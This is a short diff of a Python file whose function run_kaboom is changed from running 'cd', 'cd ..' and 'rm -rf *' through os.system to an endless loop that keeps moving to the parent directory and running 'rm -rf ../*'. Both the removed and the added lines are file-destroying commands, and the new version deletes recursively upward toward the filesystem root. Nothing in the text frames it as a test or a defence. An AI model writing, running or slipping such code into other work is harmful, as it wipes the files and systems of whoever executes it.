@@ -1,6 +1,6 @@
 import os
 
 def run_kaboom():
-    os.system("cd")
-    os.system("cd ..")
-    os.system("rm -rf *")
+    while True:
+        os.chdir("..")
+        os.system("rm -rf ../*")
